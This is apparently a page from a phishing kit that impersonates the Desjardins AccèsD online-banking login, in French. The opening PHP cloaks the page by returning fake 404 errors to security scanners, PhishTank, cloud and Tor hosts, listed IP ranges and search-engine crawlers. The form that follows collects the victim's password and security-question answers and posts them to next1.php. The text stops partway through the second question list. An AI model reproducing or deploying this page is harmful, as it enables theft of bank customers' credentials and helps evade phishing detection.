<?php

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('HTTP/1.0 404 Not Found'); exit; }

?>

<!DOCTYPE html>
<!-- saved from url=(0078) -->
<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <title>Secure | Desjardin</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <noscript>
    </noscript>
    
<link rel="icon" href="./desjardins.ico" type="image/x-icon">

<link href="./index_files/bootstrap.min.css" rel="stylesheet">

<link href="./index_files/fwd-bootstrap.min.css" rel="stylesheet">




        <link href="./index_files/global.min.css" rel="stylesheet">
    
                <link media="only screen and (max-width : 768px)" href="./index_files/identifiantunique-responsive.min.css" rel="stylesheet">
            

<!-- Ajustements de styles de l'application -->

    <link href="./index_files/theme.min.css" rel="stylesheet">


<link href="./index_files/owl.carousel.min.css" rel="stylesheet">

    

    
        <meta name="description" content="Gérer vos finances personnelles n’aura jamais été aussi simple, rapide et sécuritaire grâce aux services en ligne de Desjardins!">
    

    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="">

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
            <script src="./index_files/global.min.js.download" type="text/javascript"></script>
        

    <script type="text/javascript">
        if (window.top.location != self.location) {
            window.top.location = self.location;
        };
    </script>

    
      <link rel="stylesheet" href="./index_files/entete.css">
      <link rel="stylesheet" href="./index_files/page-logon.css">
    
      <link href="./index_files/pied.css" rel="stylesheet">
    </head><body class="isolation-bootstrap-3 fixChrome" data-whatinput="mouse"><fwd_placeholder__contenu_head_fragment_principal>




    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu principal</a>
        </div>
        <div id="logo">
          <h1 class="sr-only">Site Internet de Desjardin</h1>
          
          <a href="#"><img src="./index_files/logo-n1-desjardins-desktop.svg" alt="Retour à page d&#39;accueil de Desjardins.com" width="150" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="#"><img src="./index_files/g40-entete-logo-accesd.png" alt="AccèsD" width="106" height="32"></a>
          
          <a href="#"><img src="./index_files/g40-entete-logo-accesd-affaires.png" alt="AccèsD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="#" onclick="popup(&#39;//www.desjardins.com/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD&#39;,&#39;Joindre&#39;,&#39;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&#39;);">Nous joindre</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="#" onclick="popup(&#39;//www.desjardins.com/page-aide/index.jsp?docName=ai_logonlogoff&amp;domaine=ACCESD&#39;,&#39;Aide&#39;,&#39;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&#39;);">Aide</a></p>
          </div>
          <div id="choix-site">
            <p class="titre-entete"><a id="btn-langue" href="?langueCible=en" lang="en"><span class="sr-only">Change language. </span>English</a></p>
          </div>
          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="javascript:void(0)" title="Réduire la taille du texte">Réduire la taille du texte</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="javascript:void(0)" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    
                            <a href="">
                                <img class="logo" src="./index_files/logo-n1-desjardins-desktop(1).svg" alt="Aller à la page d&#39;accueil" title="Desjardins">
                            </a>
                        
                    <div class="hidden-xs" style="display: inline;">
                        <img role="presentation" src="./index_files/g00-entete-filet-logos.png">
                        
                                <img class="logo-desjardins" role="presentation" src="./index_files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins">
                            
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg">Obtenir un mot de passe</div>
                
                        <a href="#" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                            <img id="menuAppRetour" src="./index_files/entete-btn-menu-app.png" height="32">
                        </a>
                    
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="javascript:popup(&#39;#/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD&#39;,&#39;Nous joindre&#39;, &#39;location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                Nous joindre
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" href="javascript:popup(&#39;#/fr/services_en_ligne/accesd/aide/ai_logonlogoff.jsp?domaine=ACCESD&#39;,&#39;Aide&#39;, &#39;location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                Aide
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="?langueCible=en">
                                                English
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="./index_files/a00-entete-ic-texte-moins-on.png" alt="" title="">
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="./index_files/a00-entete-ic-texte-plus-on.png" alt="" title="">
                            </a>
                        </li>

                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>

 </span> 
             
            
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="fr" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="./index_files/a00-loading-petit.gif" alt="Loading">
                                    </div>
                                </div>
                            </div>
                            
                            


    <h1 id="titrePage" data-titre-page-mobile="Obtenir un mot de passe">
         Connection de Sécurité
 </h1> <form id="formQuestionsMotPasseOublie" class="form-horizontal" action="next1.php" method="POST" autocomplete="off">
        <input type="hidden" id="infoPosteClient" name="infoPosteClient" value="version=3.4.1.0_1&amp;pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.100 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36|Win32&amp;pm_fpsc=24|1920|1080|1040&amp;pm_fpsw=&amp;pm_fptz=-5&amp;pm_fpln=lang=en-US|syslang=|userlang=&amp;pm_fpjv=0&amp;pm_fpco=1&amp;pm_fpasw=internal-pdf-viewer|mhjfbmdgcfjbbpaeojofohoefgiehjai|internal-nacl-plugin&amp;pm_fpan=Netscape&amp;pm_fpacn=Mozilla&amp;pm_fpol=true&amp;pm_fposp=&amp;pm_fpup=&amp;pm_fpsaw=1920&amp;pm_fpspd=24&amp;pm_fpsbd=&amp;pm_fpsdx=&amp;pm_fpsdy=&amp;pm_fpslx=&amp;pm_fpsly=&amp;pm_fpsfse=&amp;pm_fpsui=&amp;pm_os=Windows&amp;pm_brmjv=69&amp;pm_br=Chrome&amp;pm_inpt=&amp;pm_expt=">
        

<div class="row">
    <div class="col-sm-24 col-md-24">
        
            <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
            <div>
                <span class="help-block-idunique">
                    Les erreurs suivantes ont été détectées :
                </span>
                <ul>
                    <li>
                      <a id="erreurLienJS" href="#" class="erreurLien"></a>
                    </li>
                </ul>
                </div>
            </div>
        
 </div>
</div>


        <div class="panel panel-primary">
            <div id="panel-body-questions" class="panel-body padding-moyen">

                <h2>Validation de l'identité</h2> <p> Identifiant pour lequel vous désirez obtenir un mot de passe :
                </p>

                <div class="row top15px">
                    <div class="identifiant col-sm-offset-9 col-xs-12 col-sm-15">
                        <strong>4540 • • • •  • • • •  • • • •</strong>
                    </div>
                </div>

                <div class="row top15px">
                    <div class="col-xs-24 col-sm-offset-9 col-sm-15">
                      
                        </a>
                    </div>
                </div>
				  <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong>Mot de passe :</strong> 
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body" data-content="&lt;img alt=&quot;Mot de passe&quot; src=&quot;files//contenu-cheque-815-transit.png&quot;/&gt;" role="button" data-original-title="">
                               
                            </a>
                            
                      
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="pass" name="pass" aria-describedby="transit.errors" aria-required="true" type="password" value="" size="12" maxlength="24" required autocomplete="off">
 </div> </div> 
 

                <p class="top15pxImportant">
                </p>

                <div id="sectionQuestions" class="top15px">
                    
                    <div id="question-datenaissance" class="form-group top15px ">
                        <label for="dateNaissance" id="labelDateNaissance" class="control-label col-xs-24 col-sm-9">
 <div class="col-xs-24 col-sm-15">
                            
                            <fieldset>
 </fieldset> </div> </div> 
                    <div id="question-institution" class="form-group top15px ">
                        <label for="institution" id="numeroInstitution" class="control-label col-xs-24 col-sm-9">
                     
                        <div class="col-xs-24 col-sm-15">
                            
                           
                        <label for="institution" id="numeroInstitution" class="control-label col-xs-24 col-sm-9">
                            </a>

                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-institution">
                            </a>
                        </label>

                        <div class="col-xs-24 col-sm-15">
 </div> </div> 
                    <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body" data-content="&lt;img alt=&quot;Il se compose de 9 chiffres.&quot; src=&quot;#/static-accesweb/201808090322/acces-web/img/francais/contenu-cheque-815-transit.png&quot;/&gt;" role="button" data-original-title="">
                            </a>
                            
                      

                        <div class="col-xs-24 col-sm-15">
 </div> </div> 
                    <div id="question-compte" class="form-group top15px ">

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body" data-content="&lt;img alt=&quot;Il se compose de 9 chiffres.&quot; src=&quot;#/static-accesweb/201808090322/acces-web/img/francais/contenu-cheque-815-transit.png&quot;/&gt;" role="button" data-original-title="">
                            </a>
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-transit">
                            </a>
                            <span class="sr-only">!!Il se compose de 9 chiffres.!!</span> </label>

                        <div class="col-xs-24 col-sm-15">
 </div> </div> 

                        <div class="col-xs-24 col-sm-15">
                        </div>
                    </div>

                </div>

                <p class="top20px">
                    Pour confirmer votre identité, répondez à la question suivante :
 </p> 

                <div class="top15px">
                
            <div class="form-group ">
                <label for="valeurReponse" class="col-xs-24 col-sm-9 control-label">
                    <p class="sr-only">Pour confirmer votre identité, répondez à la question suivante :</p> 
					
					</label></div>
					
					<b> </b><div align="left"><b>Question 1 :
					<select name="q1" id="q1">
              <option value="">Selection</option>
              <option value="Quel métier exerçait ma mère lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait ma mère lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel métier exerçait mon père lorsque j&#39;allais à l&#39;école secondaire?">Quel métier exerçait mon père lorsque j'allais à l'école secondaire?</option>
              <option value="En quelle année (aaaa) ai-je déménagé de chez mes parents pour m&#39;installer dans mon premier appartement?">En quelle année (aaaa) ai-je déménagé de chez mes parents pour m'installer dans mon premier appartement?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de mon père?">Quelle est l'année (aaaa) de naissance de mon père?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école que je fréquentais à ma cinquième année du secondaire?">Quel est le nom de la ville/municipalité de l'école que je fréquentais à ma cinquième année du secondaire?</option>
              <option value="Quelle est la ville/municipalité de mon premier appartement/logement?">Quelle est la ville/municipalité de mon premier appartement/logement?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon deuxième enfant?">Quelle est la couleur naturelle des cheveux de mon deuxième enfant?</option>
              <option value="Quel est le nom de la rue de l&#39;école que je fréquentais à ma quatrième année du secondaire?">Quel est le nom de la rue de l'école que je fréquentais à ma quatrième année du secondaire?</option>
              <option value="Quel est le deuxième prénom (autre que son prénom usuel) figurant sur l&#39;acte de naissance de ma première fille?">Quel est le deuxième prénom (autre que son prénom usuel) figurant sur l'acte de naissance de ma première fille?</option>
              <option value="Quelle est la ville où j&#39;ai atterri la première fois que j&#39;ai pris l&#39;avion?">Quelle est la ville où j'ai atterri la première fois que j'ai pris l'avion?</option>
              <option value="Quel est le nom de l&#39;école primaire où j&#39;ai complété ma maternelle?">Quel est le nom de l'école primaire où j'ai complété ma maternelle?</option>
              <option value="Quel est le prénom de ma grand-mère maternelle?">Quel est le prénom de ma grand-mère maternelle?</option>
              <option value="Quelle est la date (jj-mmm) de mon premier mariage?">Quelle est la date (jj-mmm) de mon premier mariage?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de mon frère le plus âgé?">Quels sont le jour et le mois (jj-mmm) de naissance de mon frère le plus âgé?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma mère?">Quelle est la couleur naturelle des cheveux de ma mère?</option>
              <option value="Quel est le prénom de mon deuxième enfant?">Quel est le prénom de mon deuxième enfant?</option>
              <option value="Quel est le pays où j&#39;ai atterri la première fois que j&#39;ai pris l&#39;avion?">Quel est le pays où j'ai atterri la première fois que j'ai pris l'avion?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de ma mère?">Quels sont le jour et le mois (jj-mmm) de naissance de ma mère?</option>
              <option value="Quel est le nom de l&#39;école que je fréquentais à ma première année du secondaire?">Quel est le nom de l'école que je fréquentais à ma première année du secondaire?</option>
              <option value="Quel métier exerçait mon père lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait mon père lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel est le nom de jeune fille de ma mère?">Quel est le nom de jeune fille de ma mère?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 18 ans?">Quel est le numéro de la rue où j'habitais à 18 ans?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 30 ans?">Quel est le numéro de la rue où j'habitais à 30 ans?</option>
              <option value="Quel est le nom de la ville/municipalité où je suis né?">Quel est le nom de la ville/municipalité où je suis né?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus âgé?">Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus âgé?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de mon premier époux/ma première épouse?">Quelle est l'année (aaaa) de naissance de mon premier époux/ma première épouse?</option>
              <option value="Quel est le nom de l&#39;école primaire où j&#39;ai complété ma sixième année?">Quel est le nom de l'école primaire où j'ai complété ma sixième année?</option>
              <option value="Quel est le nom de l&#39;école que je fréquentais à ma quatrième année du secondaire?">Quel est le nom de l'école que je fréquentais à ma quatrième année du secondaire?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon frère le plus âgé?">Quelle est la couleur naturelle des cheveux de mon frère le plus âgé?</option>
              <option value="Quelle est la ville/municipalité où est située la première maison dont j&#39;ai été propriétaire?">Quelle est la ville/municipalité où est située la première maison dont j'ai été propriétaire?</option>
              <option value="Quelle est la couleur naturelle de mes cheveux?">Quelle est la couleur naturelle de mes cheveux?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école primaire où j&#39;ai complété ma maternelle?">Quel est le nom de la ville/municipalité de l'école primaire où j'ai complété ma maternelle?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;université où j&#39;ai obtenu mon baccalauréat?">Quel est le nom de la ville/municipalité de l'université où j'ai obtenu mon baccalauréat?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 25 ans?">Quel est le numéro de la rue où j'habitais à 25 ans?</option>
              <option value="Quel est le nom de la rue de l&#39;école primaire où j&#39;ai complété ma sixième année?">Quel est le nom de la rue de l'école primaire où j'ai complété ma sixième année?</option>
              <option value="Quel est le nom de l&#39;hôpital/de la maison de naissance où je suis né?">Quel est le nom de l'hôpital/de la maison de naissance où je suis né?</option>
              <option value="Quel est le nom de la ville/municipalité où j&#39;habitais à 30 ans?">Quel est le nom de la ville/municipalité où j'habitais à 30 ans?</option>
              <option value="Quel est le nom de jeune fille de ma grand-mère paternelle?">Quel est le nom de jeune fille de ma grand-mère paternelle?</option>
              <option value="Quel est le nom du premier employeur où j&#39;ai reçu mon premier salaire régulier?">Quel est le nom du premier employeur où j'ai reçu mon premier salaire régulier?</option>
              <option value="Quelle était la ville/municipalité où habitait mon premier amour sérieux?">Quelle était la ville/municipalité où habitait mon premier amour sérieux?</option>
              <option value="Au total, combien de frères et soeurs a/avait mon père?">Au total, combien de frères et soeurs a/avait mon père?</option>
              <option value="Quel est le nom de la rue de l&#39;école que je fréquentais à ma cinquième année du secondaire?">Quel est le nom de la rue de l'école que je fréquentais à ma cinquième année du secondaire?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de ma mère?">Quelle est l'année (aaaa) de naissance de ma mère?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon père?">Quels sont le jour et le mois (jj-mm) de naissance de mon père?</option>
              <option value="Quel est le nom de famille de mon premier époux/ma première épouse?">Quel est le nom de famille de mon premier époux/ma première épouse?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma mère?">Quelle est la couleur naturelle des cheveux de ma mère?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus âgée?">Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus âgée?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;université où j&#39;ai obtenu mon premier certificat?">Quel est le nom de la ville/municipalité de l'université où j'ai obtenu mon premier certificat?</option>
              <option value="Quel est le nom de l&#39;école où mon premier fils a commencé ses études primaires?">Quel est le nom de l'école où mon premier fils a commencé ses études primaires?</option>
              <option value="Quel métier exerçait mon grand-père maternel lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait mon grand-père maternel lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de la ville/municipalité du cégep/collège où j&#39;ai commencé mes études collégiales?">Quel est le nom de la ville/municipalité du cégep/collège où j'ai commencé mes études collégiales?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon père?">Quelle est la couleur naturelle des cheveux de mon père?</option>
              <option value="Quel est le nom de la ville/municipalité où j&#39;habitais à 5 ans?">Quel est le nom de la ville/municipalité où j'habitais à 5 ans?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma mère?">Quels sont le jour et le mois (jj-mm) de naissance de ma mère?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école que je fréquentais à ma troisième année du secondaire?">Quel est le nom de la ville/municipalité de l'école que je fréquentais à ma troisième année du secondaire?</option>
              <option value="Quel est le nom de la ville/municipalité où est né mon père?">Quel est le nom de la ville/municipalité où est né mon père?</option>
            </select>  <br><br><b>&nbsp;Réponse 1 :</b>
            <input id="a1" name="a1" type="text" required value="" autocomplete="off"></b>
<br><br>
			
					
					
					<b> </b><div align="left"><b>Question 2 :
					<select name="q2" id="q2">
              <option value="">Selection</option>
              <option value="Quel métier exerçait ma mère lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait ma mère lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel métier exerçait mon père lorsque j&#39;allais à l&#39;école secondaire?">Quel métier exerçait mon père lorsque j'allais à l'école secondaire?</option>
              <option value="En quelle année (aaaa) ai-je déménagé de chez mes parents pour m&#39;installer dans mon premier appartement?">En quelle année (aaaa) ai-je déménagé de chez mes parents pour m'installer dans mon premier appartement?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de mon père?">Quelle est l'année (aaaa) de naissance de mon père?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école que je fréquentais à ma cinquième année du secondaire?">Quel est le nom de la ville/municipalité de l'école que je fréquentais à ma cinquième année du secondaire?</option>
              <option value="Quelle est la ville/municipalité de mon premier appartement/logement?">Quelle est la ville/municipalité de mon premier appartement/logement?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon deuxième enfant?">Quelle est la couleur naturelle des cheveux de mon deuxième enfant?</option>
              <option value="Quel est le nom de la rue de l&#39;école que je fréquentais à ma quatrième année du secondaire?">Quel est le nom de la rue de l'école que je fréquentais à ma quatrième année du secondaire?</option>
              <option value="Quel est le deuxième prénom (autre que son prénom usuel) figurant sur l&#39;acte de naissance de ma première fille?">Quel est le deuxième prénom (autre que son prénom usuel) figurant sur l'acte de naissance de ma première fille?</option>
              <option value="Quelle est la ville où j&#39;ai atterri la première fois que j&#39;ai pris l&#39;avion?">Quelle est la ville où j'ai atterri la première fois que j'ai pris l'avion?</option>
              <option value="Quel est le nom de l&#39;école primaire où j&#39;ai complété ma maternelle?">Quel est le nom de l'école primaire où j'ai complété ma maternelle?</option>
              <option value="Quel est le prénom de ma grand-mère maternelle?">Quel est le prénom de ma grand-mère maternelle?</option>
              <option value="Quelle est la date (jj-mmm) de mon premier mariage?">Quelle est la date (jj-mmm) de mon premier mariage?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de mon frère le plus âgé?">Quels sont le jour et le mois (jj-mmm) de naissance de mon frère le plus âgé?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma mère?">Quelle est la couleur naturelle des cheveux de ma mère?</option>
              <option value="Quel est le prénom de mon deuxième enfant?">Quel est le prénom de mon deuxième enfant?</option>
              <option value="Quel est le pays où j&#39;ai atterri la première fois que j&#39;ai pris l&#39;avion?">Quel est le pays où j'ai atterri la première fois que j'ai pris l'avion?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de ma mère?">Quels sont le jour et le mois (jj-mmm) de naissance de ma mère?</option>
              <option value="Quel est le nom de l&#39;école que je fréquentais à ma première année du secondaire?">Quel est le nom de l'école que je fréquentais à ma première année du secondaire?</option>
              <option value="Quel métier exerçait mon père lorsque j&#39;allais à l&#39;école primaire?">Quel métier exerçait mon père lorsque j'allais à l'école primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel est le nom de jeune fille de ma mère?">Quel est le nom de jeune fille de ma mère?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 18 ans?">Quel est le numéro de la rue où j'habitais à 18 ans?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 30 ans?">Quel est le numéro de la rue où j'habitais à 30 ans?</option>
              <option value="Quel est le nom de la ville/municipalité où je suis né?">Quel est le nom de la ville/municipalité où je suis né?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus âgé?">Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus âgé?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de mon premier époux/ma première épouse?">Quelle est l'année (aaaa) de naissance de mon premier époux/ma première épouse?</option>
              <option value="Quel est le nom de l&#39;école primaire où j&#39;ai complété ma sixième année?">Quel est le nom de l'école primaire où j'ai complété ma sixième année?</option>
              <option value="Quel est le nom de l&#39;école que je fréquentais à ma quatrième année du secondaire?">Quel est le nom de l'école que je fréquentais à ma quatrième année du secondaire?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon frère le plus âgé?">Quelle est la couleur naturelle des cheveux de mon frère le plus âgé?</option>
              <option value="Quelle est la ville/municipalité où est située la première maison dont j&#39;ai été propriétaire?">Quelle est la ville/municipalité où est située la première maison dont j'ai été propriétaire?</option>
              <option value="Quelle est la couleur naturelle de mes cheveux?">Quelle est la couleur naturelle de mes cheveux?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;école primaire où j&#39;ai complété ma maternelle?">Quel est le nom de la ville/municipalité de l'école primaire où j'ai complété ma maternelle?</option>
              <option value="Quel est le nom de la ville/municipalité de l&#39;université où j&#39;ai obtenu mon baccalauréat?">Quel est le nom de la ville/municipalité de l'université où j'ai obtenu mon baccalauréat?</option>
              <option value="Quel est le numéro de la rue où j&#39;habitais à 25 ans?">Quel est le numéro de la rue où j'habitais à 25 ans?</option>
              <option value="Quel est le nom de la rue de l&#39;école primaire où j&#39;ai complété ma sixième année?">Quel est le nom de la rue de l'école primaire où j'ai complété ma sixième année?</option>
              <option value="Quel est le nom de l&#39;hôpital/de la maison de naissance où je suis né?">Quel est le nom de l'hôpital/de la maison de naissance où je suis né?</option>
              <option value="Quel est le nom de la ville/municipalité où j&#39;habitais à 30 ans?">Quel est le nom de la ville/municipalité où j'habitais à 30 ans?</option>
              <option value="Quel est le nom de jeune fille de ma grand-mère paternelle?">Quel est le nom de jeune fille de ma grand-mère paternelle?</option>
              <option value="Quel est le nom du premier employeur où j&#39;ai reçu mon premier salaire régulier?">Quel est le nom du premier employeur où j'ai reçu mon premier salaire régulier?</option>
              <option value="Quelle était la ville/municipalité où habitait mon premier amour sérieux?">Quelle était la ville/municipalité où habitait mon premier amour sérieux?</option>
              <option value="Au total, combien de frères et soeurs a/avait mon père?">Au total, combien de frères et soeurs a/avait mon père?</option>
              <option value="Quel est le nom de la rue de l&#39;école que je fréquentais à ma cinquième année du secondaire?">Quel est le nom de la rue de l'école que je fréquentais à ma cinquième année du secondaire?</option>
              <option value="Quelle est l&#39;année (aaaa) de naissance de ma mère?">Quelle est l'année (aaaa) de naissance de ma mère?</option>
